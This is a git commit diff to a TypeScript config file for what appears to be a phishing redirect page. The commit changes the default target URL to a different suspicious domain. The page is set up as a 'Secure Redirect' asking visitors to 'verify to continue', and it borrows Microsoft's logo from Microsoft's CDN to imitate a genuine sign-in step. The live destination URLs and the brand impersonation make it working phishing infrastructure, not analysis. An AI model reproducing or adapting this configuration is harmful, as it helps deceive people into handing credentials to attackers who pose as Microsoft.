b2c19a7f3f45900cb29a0d46dcd9b8a6318ba453
henrybos09 <henryboston@6sboston.com>
2026-02-09 14:32:00 -0800

    Update config.ts

--- src/config/config.ts
+++ src/config/config.ts
@@ -18,7 +18,7 @@ export interface Config {
 }
 
 export const defaultConfig: Config = {
-  defaultTargetUrl: 'https://meheff.a8fdunxe2nb6y3n1kzlwykbse305mntqxwfgsmmasnyaxdb.xyz/TPCJyWnp',
+  defaultTargetUrl: 'https://spring.hivicha.biz.id/lqpQ11ftmD@sxntiHIvHl/',
   headerTitle: 'Secure Redirect',
   headerSubtitle: 'Please verify to continue',
   leftLogoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
